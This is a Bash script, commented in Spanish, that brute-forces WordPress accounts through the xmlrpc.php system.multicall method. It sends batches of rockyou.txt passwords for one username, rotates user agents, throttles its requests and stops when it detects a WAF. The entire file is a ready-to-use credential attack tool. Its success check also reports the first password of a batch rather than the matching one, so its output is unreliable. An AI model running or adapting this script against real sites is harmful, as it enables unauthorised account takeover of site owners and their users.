#!/bin/bash

function ctrl_c() {
    echo -e "\n[!] Interrumpido. Saliendo..."
    rm -f file.xml
    exit 1
}
trap ctrl_c SIGINT

# Config
target="https://test.es/xmlrpc.php" # URL del XML-RPC
username="test" # Nombre de usuario
wordlist="/usr/share/wordlists/rockyou.txt"
batch_size=10  # nº de passwords por system.multicall
delay=6

user_agents=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
  "Mozilla/5.0 (X11; Linux x86_64)"
)

echo "[~] Ejecutando fuerza bruta con system.multicall contra $target..."

batch=()
counter=0

function send_batch() {
  ua=${user_agents[$RANDOM % ${#user_agents[@]}]}

  # Crear payload
  echo '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>' > file.xml

  for pwd in "${batch[@]}"; do
    echo "<value><struct>" >> file.xml
    echo "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>" >> file.xml
    echo "<member><name>params</name><value><array><data>" >> file.xml
    echo "<value><array><data>" >> file.xml
    echo "<value><string>$username</string></value>" >> file.xml
    echo "<value><string>$pwd</string></value>" >> file.xml
    echo "</data></array></value>" >> file.xml
    echo "</data></array></value></member></struct></value>" >> file.xml
  done

  echo "</data></array></value></param></params></methodCall>" >> file.xml

  response=$(curl -s -A "$ua" -X POST "$target" -H "Content-Type: text/xml" --connect-timeout 10 --max-time 15 -d @file.xml)

  if [[ -z "$response" ]]; then
    echo -e "\n[!] Respuesta vacía. Posible bloqueo."
    exit 1
  fi

  if echo "$response" | grep -qiE "denied|forbidden|cloudflare|blocked|access denied"; then
    echo -e "\n[!] WAF o bloqueo detectado. Abortando."
    exit 1
  fi

  for i in "${!batch[@]}"; do
    pwd="${batch[$i]}"
    if echo "$response" | grep -q "<name>isAdmin</name>"; then
      echo -e "\n[+] Contraseña válida encontrada: $pwd"
      rm -f file.xml
      exit 0
    fi
  done

  batch=()
  sleep $delay
}

while IFS= read -r line; do
  batch+=("$line")
  ((counter++))

  if [[ "$counter" -ge "$batch_size" ]]; then
    send_batch
    counter=0
  fi
done < "$wordlist"

# Enviar el resto si quedó algo pendiente
if [[ "${#batch[@]}" -gt 0 ]]; then
  send_batch
fi

echo "[×] No se encontró ninguna contraseña válida."
rm -f file.xml
